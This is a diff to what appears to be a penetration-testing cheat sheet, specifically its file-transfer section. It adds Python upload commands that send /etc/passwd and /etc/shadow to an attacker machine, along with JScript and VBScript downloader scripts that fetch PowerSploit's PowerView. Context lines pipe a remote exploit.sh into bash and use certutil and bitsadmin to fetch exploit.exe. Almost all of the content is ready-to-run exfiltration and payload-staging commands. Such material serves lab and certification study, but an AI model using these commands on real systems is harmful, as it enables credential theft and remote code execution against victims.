@@ -793,6 +793,16 @@ C:\> nc.exe -nlvp 443 < file.txt
 $ nc -nv <IP address> 443 > file.txt
 ```
 
+- Python Web Uploads over HTTPS (Linux -> Kali)
+
+```
+$ sudo python3 -m pip install --user uploadserver
+$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+$ mkdir https && cd https
+$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+$ curl -X POST https://<IP address>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
 - Python3 Server (Kali -> Windows/Kali)
 
 ```
@@ -806,6 +816,13 @@ $ curl http://<IP address>:8000/exploit.sh | bash
 
 ```
 $ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+- Python3 Uploads (Linux -> Kali)
+
+```
+$ python3 -m uploadserver
+$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 - Python2.7 Server (Kali -> Windows/Kali)
@@ -888,16 +905,6 @@ C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
 
 ```
 C:\> scp /tmp/exploit.sh <user>@<IP address>:/tmp/exploit.sh
-```
-
-- Python Web Uploads over HTTPS (Linux -> Kali)
-
-```
-$ sudo python3 -m pip install --user uploadserver
-$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-$ mkdir https && cd https
-$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
-$ curl -X POST https://<IP address>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
 - PowerShell DownloadFile (Kali -> Windows)
@@ -1052,6 +1059,41 @@ C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
 
 ```
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
+```
+
+- JavaScript (cscript.exe) Downloads (Kali -> Windows)
+
+```
+# Save to wget.js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+
+C:\> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+- VBScript (cscript.exe) Downloads (Kali -> Windows)
+
+```
+# Save to wget.vbs
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+
+C:\> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
 #8. - Restricted Shell Escapes
